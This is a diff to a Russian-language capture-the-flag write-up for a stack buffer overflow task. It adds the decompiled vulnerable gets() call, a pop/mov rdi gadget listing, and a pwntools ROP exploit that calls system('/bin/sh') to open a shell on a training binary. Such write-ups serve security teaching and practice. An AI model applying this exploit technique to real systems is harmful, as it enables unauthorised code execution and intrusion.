@@ -5,11 +5,28 @@
 **[libc-2.31.so](https://pwn.spbctf.ru/files/aslr/popa_ot_ropa/libc-2.31.so)**
 
 Имеется уязвимость переполнения буфера, можно создать ROP-цепочку.
-![{AC157946-B7E2-4651-B6DE-7E7F56E0F897}](../../../../z.%20Images/{AC157946-B7E2-4651-B6DE-7E7F56E0F897}.png)
+``` c
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  char v4[64]; // [rsp+0h] [rbp-40h] BYREF
+
+  show_memory(argc, argv, envp);
+  puts("I have no useful functionality. Better add your own!");
+  gets(v4);
+  return 0;
+}
+```
 Причём ASLR отключён и программа предоставляет все адреса памяти.
 
 Также имеется гаджет для `pop rdi`.
-![Pasted image 20260325095208](../../../../z.%20Images/Pasted%20image%2020260325095208.png)
+```
+.text:00000000004011B3 g_pop_rax       proc near
+.text:00000000004011B3 ; __unwind {
+.text:00000000004011B3                 pop     rax
+.text:00000000004011B4                 mov     rdi, rax
+.text:00000000004011B7                 retn
+.text:00000000004011B7 g_pop_rax       endp ; sp-analysis failed
+```
 
 Заполнение буфера:
 1. Буфер
@@ -18,8 +35,22 @@
 4. `system` addr
 К задаче прикреплена версия `libc`, там можно найти строку `bin/sh`, а адрес функции `system` находится внутри самой программы.
 
-Солвер:
-![{6DD2BC32-64D2-474E-9D49-31C886F931FF}](../../../../z.%20Images/{6DD2BC32-64D2-474E-9D49-31C886F931FF}.png)
+Эксплоит:
+``` python
+pop_rdi = 0x4011B3
+bin_sh = 0x7ffff7de3000 + 0x18A156
+sysyem = 0x401040
+
+io = start()
+
+payload = b'A' * 72
+payload += p64(pop_rdi) + p64(bin_sh)
+payload += p64(sysyem)
+
+io.sendline(payload)
+
+io.interactive()
+```
 
 Запуск:
 ![{CF611CBA-8C34-46CB-8BB3-FB7F68F82CAE}](../../../../z.%20Images/{CF611CBA-8C34-46CB-8BB3-FB7F68F82CAE}.png)
